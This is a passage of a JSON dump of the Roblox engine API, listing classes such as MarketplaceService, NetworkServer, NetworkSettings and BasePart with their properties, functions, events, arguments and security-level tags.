","tags":[],"Class":"LuaSettings"},{"ValueType":"float","type":"Property","Name":"WaitingThreadsBudget","tags":[],"Class":"LuaSettings"},{"Superclass":"Instance","type":"Class","Name":"LuaSourceContainer","tags":[]},{"Superclass":"LuaSourceContainer","type":"Class","Name":"BaseScript","tags":[]},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"BaseScript"},{"ValueType":"Content","type":"Property","Name":"LinkedSource","tags":[],"Class":"BaseScript"},{"Superclass":"BaseScript","type":"Class","Name":"CoreScript","tags":["notCreatable"]},{"Superclass":"BaseScript","type":"Class","Name":"Script","tags":[]},{"ValueType":"ProtectedString","type":"Property","Name":"Source","tags":["PluginSecurity"],"Class":"Script"},{"ReturnType":"string","Arguments":[],"Name":"GetHash","tags":["RobloxPlaceSecurity"],"Class":"Script","type":"Function"},{"Superclass":"Script","type":"Class","Name":"LocalScript","tags":[]},{"Superclass":"LuaSourceContainer","type":"Class","Name":"ModuleScript","tags":[]},{"ValueType":"Content","type":"Property","Name":"LinkedSource","tags":[],"Class":"ModuleScript"},{"ValueType":"ProtectedString","type":"Property","Name":"Source","tags":["PluginSecurity"],"Class":"ModuleScript"},{"Superclass":"Instance","type":"Class","Name":"LuaWebService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"MarketplaceService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"productId","Default":null}],"Name":"PromptNativePurchase","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"productId","Default":null},{"Type":"bool","Name":"equipIfPurchased","Default":"true"},{"Type":"CurrencyType","Name":"currencyType","Default":"Default"}],"Name":"PromptProductPurchase","tags":[],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"equipIfPurchased","Default":"true"},{"Type":"CurrencyType","Name":"currencyType","Default":"Default"}],"Name":"PromptPurchase","tags":[],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"productId","Default":null}],"Name":"PromptThirdPartyPurchase","tags":["RobloxPlaceSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetId","Default":null},{"Type":"int","Name":"robuxAmount","Default":null}],"Name":"ReportAssetSale","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReportRobuxUpsellStarted","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"ticket","Default":null},{"Type":"int","Name":"playerId","Default":null},{"Type":"int","Name":"productId","Default":null}],"Name":"SignalClientPurchaseSuccess","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"productId","Default":null},{"Type":"bool","Name":"success","Default":null}],"Name":"SignalPromptProductPurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"success","Default":null}],"Name":"SignalPromptPurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SignalServerLuaDialogClosed","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeveloperProductsAsync","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"InfoType","Name":"infoType","Default":"Asset"}],"Name":"GetProductInfo","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null}],"Name":"PlayerOwnsAsset","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"ClientLuaDialogRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"ticket","Type":"string"},{"Name":"playerId","Type":"int"},{"Name":"productId","Type":"int"}],"Name":"ClientPurchaseSuccess","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"string"},{"Name":"wasPurchased","Type":"bool"}],"Name":"NativePurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"productId","Type":"int"},{"Name":"isPurchased","Type":"bool"}],"Name":"PromptProductPurchaseFinished","tags":["deprecated"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"int"},{"Name":"equipIfPurchased","Type":"bool"},{"Name":"currencyType","Type":"CurrencyType"}],"Name":"PromptProductPurchaseRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"assetId","Type":"int"},{"Name":"isPurchased","Type":"bool"}],"Name":"PromptPurchaseFinished","tags":[],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"assetId","Type":"int"},{"Name":"equipIfPurchased","Type":"bool"},{"Name":"currencyType","Type":"CurrencyType"}],"Name":"PromptPurchaseRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"serverResponseTable","Type":"Dictionary"}],"Name":"ServerPurchaseVerification","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"string"},{"Name":"receipt","Type":"string"},{"Name":"wasPurchased","Type":"bool"}],"Name":"ThirdPartyPurchaseFinished","tags":["RobloxPlaceSecurity"],"Class":"MarketplaceService","type":"Event"},{"ReturnType":"ProductPurchaseDecision","Arguments":[{"Name":"receiptInfo","Type":"Dictionary"}],"Name":"ProcessReceipt","tags":[],"Class":"MarketplaceService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"Message","tags":["deprecated"]},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"Message"},{"Superclass":"Message","type":"Class","Name":"Hint","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"Mouse","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"Hit","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Content","type":"Property","Name":"Icon","tags":[],"Class":"Mouse"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Origin","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"Target","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"TargetFilter","tags":[],"Class":"Mouse"},{"ValueType":"NormalId","type":"Property","Name":"TargetSurface","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Ray","type":"Property","Name":"UnitRay","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"ViewSizeX","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"ViewSizeY","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"X","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"Y","tags":["readonly"],"Class":"Mouse"},{"ValueType":"CoordinateFrame","type":"Property","Name":"hit","tags":["deprecated","hidden","readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"target","tags":["deprecated","readonly"],"Class":"Mouse"},{"Arguments":[],"Name":"Button1Down","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button1Up","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button2Down","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button2Up","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Idle","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"KeyDown","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"KeyUp","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Move","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"WheelBackward","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"WheelForward","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"keyDown","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Superclass":"Mouse","type":"Class","Name":"PlayerMouse","tags":[]},{"Superclass":"Mouse","type":"Class","Name":"PluginMouse","tags":[]},{"Arguments":[{"Name":"instances","Type":"Objects"}],"Name":"DragEnter","tags":["PluginSecurity"],"Class":"PluginMouse","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkMarker","tags":["notbrowsable"]},{"Arguments":[],"Name":"Received","tags":[],"Class":"NetworkMarker","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkPeer","tags":["notbrowsable"]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"limit","Default":null}],"Name":"SetOutgoingKBPSLimit","tags":["PluginSecurity"],"Class":"NetworkPeer","type":"Function"},{"Superclass":"NetworkPeer","type":"Class","Name":"NetworkClient","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"Ticket","tags":[],"Class":"NetworkClient"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"blockDuration","Default":"3000"}],"Name":"Disconnect","tags":["LocalUserSecurity"],"Class":"NetworkClient","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"string","Name":"server","Default":null},{"Type":"int","Name":"serverPort","Default":null},{"Type":"int","Name":"clientPort","Default":"0"},{"Type":"int","Name":"threadSleepTime","Default":"30"}],"Name":"PlayerConnect","tags":["PluginSecurity"],"Class":"NetworkClient","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"gameSessionID","Default":null}],"Name":"SetGameSessionID","tags":["RobloxSecurity"],"Class":"NetworkClient","type":"Function"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"replicator","Type":"Instance"}],"Name":"ConnectionAccepted","tags":[],"Class":"NetworkClient","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"code","Type":"int"},{"Name":"reason","Type":"string"}],"Name":"ConnectionFailed","tags":[],"Class":"NetworkClient","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"}],"Name":"ConnectionRejected","tags":[],"Class":"NetworkClient","type":"Event"},{"Superclass":"NetworkPeer","type":"Class","Name":"NetworkServer","tags":["notCreatable"]},{"ValueType":"int","type":"Property","Name":"Port","tags":["readonly"],"Class":"NetworkServer"},{"ReturnType":"void","Arguments":[],"Name":"ConfigureAsCloudEditServer","tags":["RobloxSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ConfigureAsTeamTestServer","tags":["RobloxSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetClientCount","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetIsPlayerAuthenticationRequired","tags":["RobloxSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"port","Default":"0"},{"Type":"int","Name":"threadSleepTime","Default":"20"}],"Name":"Start","tags":["PluginSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"blockDuration","Default":"1000"}],"Name":"Stop","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Function"},{"Arguments":[{"Name":"peer","Type":"Instance"},{"Name":"result","Type":"FilterResult"},{"Name":"instance","Type":"Instance"},{"Name":"member","Type":"string"}],"Name":"DataBasicFiltered","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Event"},{"Arguments":[{"Name":"peer","Type":"Instance"},{"Name":"result","Type":"FilterResult"},{"Name":"instance","Type":"Instance"},{"Name":"member","Type":"string"}],"Name":"DataCustomFiltered","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"replicator","Type":"Instance"}],"Name":"IncommingConnection","tags":["RobloxScriptSecurity"],"Class":"NetworkServer","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkReplicator","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"MachineAddress","tags":["LocalUserSecurity","readonly"],"Class":"NetworkReplicator"},{"ValueType":"int","type":"Property","Name":"Port","tags":["LocalUserSecurity","readonly"],"Class":"NetworkReplicator"},{"ReturnType":"void","Arguments":[],"Name":"CloseConnection","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"DisableProcessPackets","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"EnableProcessPackets","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetPlayer","tags":[],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"verbosityLevel","Default":"0"}],"Name":"GetRakStatsString","tags":["PluginSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RequestCharacter","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"SendMarker","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetPropSyncExpiration","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"lostConnection","Type":"bool"}],"Name":"Disconnection","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Event"},{"Superclass":"NetworkReplicator","type":"Class","Name":"ClientReplicator","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"request","Default":null}],"Name":"RequestServerStats","tags":["RobloxScriptSecurity"],"Class":"ClientReplicator","type":"Function"},{"Arguments":[{"Name":"stats","Type":"Dictionary"}],"Name":"StatsReceived","tags":["RobloxScriptSecurity"],"Class":"ClientReplicator","type":"Event"},{"Superclass":"NetworkReplicator","type":"Class","Name":"ServerReplicator","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"PreventTerrainChanges","tags":["RobloxPlaceSecurity"],"Class":"ServerReplicator","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetBasicFilteringEnabled","tags":["RobloxPlaceSecurity"],"Class":"ServerReplicator","type":"Function"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"isAuthenticated","Type":"bool"},{"Name":"protocolVersion","Type":"int"}],"Name":"TicketProcessed","tags":[],"Class":"ServerReplicator","type":"Event"},{"ReturnType":"FilterResult","Arguments":[{"Name":"deletingItem","Type":"Instance"}],"Name":"DeleteFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"ReturnType":"FilterResult","Arguments":[{"Name":"firingItem","Type":"Instance"},{"Name":"event","Type":"string"}],"Name":"EventFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"ReturnType":"FilterResult","Arguments":[{"Name":"newItem","Type":"Instance"},{"Name":"parent","Type":"Instance"}],"Name":"NewFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"ReturnType":"FilterResult","Arguments":[{"Name":"changingItem","Type":"Instance"},{"Name":"member","Type":"string"},{"Name":"value","Type":"Variant"}],"Name":"PropertyFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"NetworkSettings","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"ArePhysicsRejectionsReported","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"CanSendPacketBufferLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"ClientPhysicsSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"DataGCRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"DataMtuAdjust","tags":[],"Class":"NetworkSettings"},{"ValueType":"PacketPriority","type":"Property","Name":"DataSendPriority","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"DataSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"EnableHeavyCompression","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ExperimentalPhysicsEnabled","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"ExtraMemoryUsed","tags":["PluginSecurity","hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"FreeMemoryMBytes","tags":["PluginSecurity","hidden","readonly"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"FreeMemoryPoolMBytes","tags":["PluginSecurity","hidden","readonly"],"Class":"NetworkSettings"},{"ValueType":"double","type":"Property","Name":"IncommingReplicationLag","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsQueueErrorComputed","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsThrottledByCongestionControl","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsThrottledByOutgoingBandwidthLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"MaxDataModelSendBuffer","tags":["deprecated"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"NetworkOwnerRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"PhysicsMtuAdjust","tags":[],"Class":"NetworkSettings"},{"ValueType":"PhysicsReceiveMethod","type":"Property","Name":"PhysicsReceive","tags":[],"Class":"NetworkSettings"},{"ValueType":"PhysicsSendMethod","type":"Property","Name":"PhysicsSend","tags":[],"Class":"NetworkSettings"},{"ValueType":"PacketPriority","type":"Property","Name":"PhysicsSendPriority","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"PhysicsSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"PreferredClientPort","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintBits","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintEvents","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintFilters","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintInstances","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintPhysicsErrors","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintProperties","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintSplitMessage","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintStreamInstanceQuota","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintTouches","tags":[],"Class":"NetworkSettings"},{"ValueType":"double","type":"Property","Name":"ReceiveRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"RenderStreamedRegions","tags":[],"Class":"NetworkSettings"},{"ValueType":"string","type":"Property","Name":"ReportStatURL","tags":["deprecated","hidden"],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"SendPacketBufferLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ShowActiveAnimationAsset","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ShowPartMovementWayPoint","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"TotalNumMovementWayPoint","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"TouchSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"TrackDataTypes","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"TrackPhysicsDetails","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"UseInstancePacketCache","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"UsePhysicsPacketCache","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"WaitingForCharacterLogRate","tags":["deprecated","hidden"],"Class":"NetworkSettings"},{"Superclass":"Instance","type":"Class","Name":"NotificationService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"CancelAllNotification","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"alertId","Default":null}],"Name":"CancelNotification","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"alertId","Default":null},{"Type":"string","Name":"alertMsg","Default":null},{"Type":"int","Name":"minutesToFire","Default":null}],"Name":"ScheduleNotification","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetScheduledNotifications","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"NumberValue","tags":[]},{"ValueType":"double","type":"Property","Name":"Value","tags":[],"Class":"NumberValue"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"Changed","tags":[],"Class":"NumberValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"changed","tags":["deprecated"],"Class":"NumberValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ObjectValue","tags":[]},{"ValueType":"Object","type":"Property","Name":"Value","tags":[],"Class":"ObjectValue"},{"Arguments":[{"Name":"value","Type":"Instance"}],"Name":"Changed","tags":[],"Class":"ObjectValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"Instance"}],"Name":"changed","tags":["deprecated"],"Class":"ObjectValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"OneQuarterClusterPacketCacheBase","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PVInstance","tags":["notbrowsable"]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CoordinateFrame","tags":["deprecated","writeonly"],"Class":"PVInstance"},{"Superclass":"PVInstance","type":"Class","Name":"BasePart","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Anchored","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BackParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BackParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"BackSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"BackSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BottomParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BottomParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"BottomSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"BottomSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"BrickColor","type":"Property","Name":"BrickColor","tags":[],"Class":"BasePart"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"BasePart"},{"ValueType":"bool","type":"Property","Name":"CanCollide","tags":[],"Class":"BasePart"},{"ValueType":"Color3","type":"Property","Name":"Color","tags":["deprecated"],"Class":"BasePart"},{"ValueType":"PhysicalProperties","type":"Property","Name":"CustomPhysicalProperties","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Elasticity","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Friction","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"FrontParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"FrontParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"FrontSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"FrontSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LeftParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LeftParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"LeftSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"LeftSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LocalTransparencyModifier","tags":["hidden"],"Class":"BasePart"},{"ValueType":"bool","type":"Property","Name":"Locked","tags":[],"Class":"BasePart"},{"ValueType":"Material","type":"Property","Name":"Material","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"ReceiveAge","tags":["hidden","readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Reflectance","tags":[],"Class":"BasePart"},{"ValueType":"int","type":"Property","Name":"ResizeIncrement","tags":["readonly"],"Class":"BasePart"},{"ValueType":"Faces","type":"Property","Name":"ResizeableFaces","tags":["readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"RightParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"RightParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"RightSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"RightSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"RotVelocity","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Rotation","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Size","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"SpecificGravity","tags":["readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"TopParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"TopParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"TopSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"TopSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Velocity","tags":[],"Class":"BasePart"},{"ValueType":"BrickColor","type":"Property","Name":"brickColor","tags":["deprecated"],"Class":"BasePart"},{"ReturnType":"void","Arguments":[],"Name":"BreakJoints","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"CanSetNetworkOwnership","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"GetConnectedParts","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetMass","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetNetworkOwner","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetNetworkOwnershipAuto","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetRenderCFrame","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetRootPart","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetTouchingParts","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsGrounded","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MakeJoints","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"NormalId","Name":"normalId","Default":null},{"Type":"int","Name":"deltaAmount","Default":null}],"Name":"Resize","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"playerInstance","Default":"nil"}],"Name":"SetNetworkOwner","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetNetworkOwnershipAuto","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"breakJoints","tags":["deprecated"],"C